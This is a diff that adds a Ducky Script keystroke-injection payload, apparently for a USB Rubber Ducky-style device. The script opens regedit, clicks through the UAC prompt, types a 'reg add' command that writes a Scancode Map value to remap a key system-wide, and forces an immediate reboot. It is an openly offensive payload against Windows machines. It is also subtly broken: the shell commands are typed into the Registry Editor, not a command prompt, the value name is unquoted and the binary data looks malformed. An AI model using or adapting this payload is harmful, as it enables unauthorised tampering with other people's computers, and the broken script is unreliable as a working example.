@@ -1,0 +1,29 @@
+DELAY 5000
+REM Open the Registry Editor
+GUI r
+DELAY 500
+STRING regedit
+ENTER
+DELAY 1000
+
+REM Bypass the UAC prompt (if UAC is enabled and assuming you have administrator rights)
+ALT y
+DELAY 1000
+
+REM Navigate to the Keyboard Layout key
+STRING HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout
+ENTER
+DELAY 1000
+
+REM Create a new Scancode Map binary value
+STRING reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Keyboard Layout" /v Scancode Map /t REG_BINARY /d 00000000000000000200000000B3270000000000 /f
+ENTER
+DELAY 1000
+
+REM Close the Registry Editor
+ALT F4
+
+REM Restart the computer to apply changes
+DELAY 500
+STRING shutdown /r /t 0
+ENTER
